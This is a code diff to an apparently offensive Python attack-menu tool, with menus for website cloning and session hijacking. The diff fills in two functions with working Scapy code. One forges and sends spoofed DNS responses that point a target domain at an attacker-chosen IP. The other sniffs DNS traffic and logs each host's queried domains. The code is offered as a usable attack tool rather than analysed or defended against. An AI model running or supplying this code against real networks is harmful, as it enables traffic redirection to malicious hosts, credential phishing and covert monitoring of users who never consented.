@@ -1,3 +1,4 @@
+from scapy.all import *
 import os
 import shutil
 import subprocess
@@ -52,10 +53,21 @@ def dns_spoofing_menu():
 def perform_dns_spoofing():
     """Perform DNS spoofing attack."""
     print("[+] Performing DNS Spoofing Attack...")
-    # Additional steps:
-    # 1. Set up a DNS server or use existing tools like dnsmasq
-    # 2. Configure DNS server to respond to DNS queries for target domains with spoofed IP addresses
-    # 3. Use techniques like ARP spoofing to redirect traffic to the attacker-controlled DNS server
+    target_ip = input("Enter the target IP address: ")
+    dns_server_ip = input("Enter the DNS server IP address: ")
+    target_domain = input("Enter the target domain to spoof: ")
+    spoofed_ip = input("Enter the IP address to spoof: ")
+
+    # Create a DNS response packet with spoofed IP
+    spoofed_pkt = IP(dst=target_ip) / UDP(dport=53) / DNS(
+        qr=1,
+        id=42,
+        an=DNSRR(rrname=target_domain, ttl=10, rdata=spoofed_ip)
+    )
+
+    # Send the spoofed DNS response
+    send(spoofed_pkt, verbose=False)
+
     print("[+] DNS spoofing attack completed successfully.")
 
 def website_cloning_menu():
@@ -229,9 +241,17 @@ def advanced_attacks_menu():
 def packet_sniffing():
     """Perform packet sniffing."""
     print("[+] Starting Packet Sniffing...")
-    # Additional steps:
-    # 1. Choose a network interface for sniffing
-    # 2. Capture and analyze network traffic
+
+    def packet_callback(packet):
+        if packet.haslayer(DNS) and packet.haslayer(IP):
+            dns_req = packet[DNS]
+            ip_src = packet[IP].src
+            queried_domain = dns_req.qd.qname.decode()
+            print(f"DNS Request from {ip_src} for {queried_domain}")
+
+    # Sniff packets and call packet_callback for each packet
+    sniff(filter="udp port 53", prn=packet_callback, store=0)
+
     print("[+] Packet Sniffing completed successfully.")
 
 def session_hijacking():
